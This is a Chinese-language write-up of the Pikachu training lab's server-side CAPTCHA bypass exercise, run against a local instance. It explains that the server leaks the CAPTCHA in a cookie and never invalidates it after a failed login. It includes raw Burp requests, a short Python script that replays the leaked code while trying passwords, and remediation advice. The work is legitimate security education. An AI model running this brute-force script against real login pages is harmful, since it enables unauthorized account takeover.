Pikachu - 暴力破解 - 服务端验证码绕过

# Pikachu # Web # 验证码绕过 # Burp Repeater # Python

一、题目信息

  • 题目名称：验证码绕过（on server）
  • 题目路径：Pikachu → 暴力破解 → 验证码绕过（on server）
  • 题目方向：Web - 暴力破解与验证码安全
  • 题目环境：本地部署，PHP 7.4.33 + MariaDB 10.11.19 + PHP 内置服务器
  • 访问地址：http://127.0.0.1/pikachu/vul/burteforce/bf_server.php
  • 题目目标：绕过服务端验证码校验，登录 admin 账号。
本文章仅记录本机 Pikachu 靶场中的验证码绕过实验，不针对任何未授权系统。

二、漏洞原理

页面同时提交用户名、密码和验证码：

POST /pikachu/vul/burteforce/bf_server.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=wrong&vcode=6deci0&submit=Login

服务端使用 $_SESSION['vcode'] 保存当前验证码，并将提交值与 Session 中的值比较：

if (strtolower($_POST['vcode']) != strtolower($_SESSION['vcode'])) {
    $html .= "<p class='notice'>验证码输入错误</p>";
} else {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $sql = "select * from users where username=? and password=md5(?)";
    // 校验用户名和密码
}

这段代码存在两个关键问题：

  1. 验证码在登录失败后没有被销毁，同一个 Session 可以重复使用。
  2. 验证码生成后还会通过 Cookie 明文返回给客户端。

查看验证码接口 inc/showvcode.php，可以发现：

session_start();
include_once 'function.php';

$_SESSION['vcode'] = vcodex();
setcookie('bf[vcode]', $_SESSION['vcode']);

因此攻击者不需要识别图片，只要读取响应中的 bf[vcode] Cookie，就能获得真实验证码：

Set-Cookie: bf[vcode]=6deci0; ...
Set-Cookie: PHPSESSID=<your-session-id>; path=/
验证码必须由服务端安全保存和校验，不能将验证码值直接返回给客户端；一次验证结束后还应立即销毁。

三、Burp Repeater 复现

3.1 获取验证码

  1. 使用 Burp Browser 访问 bf_server.php。
  2. 在 Proxy → HTTP history 中找到 GET /pikachu/inc/showvcode.php。
  3. 查看响应头，记录 PHPSESSID 与 bf[vcode]。

本实验中获取到的会话和验证码形式如下：

PHPSESSID=<your-session-id>
bf[vcode]=6deci0

3.2 发送错误密码

将以下请求发送到 Repeater：

POST /pikachu/vul/burteforce/bf_server.php HTTP/1.1
Host: 127.0.0.1
Cookie: PHPSESSID=<your-session-id>
Content-Type: application/x-www-form-urlencoded
Connection: close

username=admin&password=wrong&vcode=6deci0&submit=Login

响应中出现：

<p> username or password is not exists</p>

这说明验证码已经通过，只是密码错误。此时验证码没有被销毁。

3.3 复用验证码登录

保持 PHPSESSID 和 vcode 不变，仅修改密码：

username=admin&password=123456&vcode=6deci0&submit=Login

服务器返回：

<p> login success</p>
请求密码验证码结果
第 1 次wrong6deci0username or password is not exists
第 2 次1234566deci0login success
username: admin
password: 123456

四、Python 自动化复现

使用 requests.Session() 保持会话，并从 Cookie 中读取验证码：

import requests

BASE = "http://127.0.0.1/pikachu"
LOGIN = BASE + "/vul/burteforce/bf_server.php"
CAPTCHA = BASE + "/inc/showvcode.php"

s = requests.Session()
s.get(LOGIN, timeout=5)
s.get(CAPTCHA, timeout=5)

sid = s.cookies.get("PHPSESSID")
vcode = s.cookies.get("bf[vcode]")

for password in ["wrong", "123456"]:
    response = s.post(
        LOGIN,
        data={
            "username": "admin",
            "password": password,
            "vcode": vcode,
            "submit": "Login",
        },
        timeout=5,
    )
    print(password, "login success" in response.text)

执行结果：

wrong False
123456 True

脚本没有识别任何验证码图片，而是直接读取服务端泄露的明文验证码；随后在同一个 Session 中连续复用，直到密码正确。

五、漏洞危害

  • 验证码失去防自动化作用，无法阻止暴力破解。
  • 攻击者可以复用同一会话和验证码进行多次密码尝试。
  • 若登录接口没有失败次数限制，可进一步造成账号接管。

六、修复建议

  • 验证码仅保存在服务端：不要在 Cookie、响应正文或前端代码中返回验证码明文。
  • 验证后立即销毁：无论登录成功还是失败，都执行 unset($_SESSION['vcode'])。
  • 设置短有效期：验证码超过 1～5 分钟后自动失效。
  • 限制登录频率：同一账号或 IP 连续失败后增加延迟、验证码或临时锁定。
  • 使用安全随机数：验证码值应由密码学安全随机源生成。
  • 配合 MFA：敏感账号增加二次验证，降低单一口令泄露带来的风险。

七、总结

本题的核心不是“破解验证码图像”，而是服务端错误地将验证码明文写入 Cookie，并且验证码在失败后没有失效。两者叠加后，验证码从防爆破机制变成了可直接读取和重复使用的普通参数。

判断此类漏洞时，重点观察三点：验证码是否来自服务端安全 Session、使用后是否立即销毁、以及是否存在登录频率限制。修复时不能只隐藏图片或增加前端校验，所有关键状态都必须由服务端维护。
